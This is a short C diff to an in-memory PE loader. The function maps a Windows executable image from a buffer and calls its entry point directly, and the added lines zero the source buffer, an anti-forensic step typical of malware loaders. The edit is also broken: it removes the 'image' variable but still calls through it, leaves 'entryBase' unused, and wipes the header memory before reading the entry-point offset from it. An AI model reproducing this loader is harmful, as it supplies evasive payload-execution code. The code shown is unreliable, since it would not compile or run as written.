@@ -188,9 +188,14 @@ static void* MapImage(unsigned char* data) {
 
 // -------------------- Execute entry --------------------
 static void ExecuteFromMemory(unsigned char* data) {
-    BYTE* image = MapImage(data);
-    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)image;
-    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(image + dos->e_lfanew);
+    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)data;
+    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(data + dos->e_lfanew);
+
+    PVOID entryBase = MapImage(data);
+
+    SIZE_T sz = nt->OptionalHeader.SizeOfImage;
+    volatile BYTE* wipe = data;
+    while (sz--) *wipe++ = 0;
 
     ((void(*)(void))(image + nt->OptionalHeader.AddressOfEntryPoint))();
 }
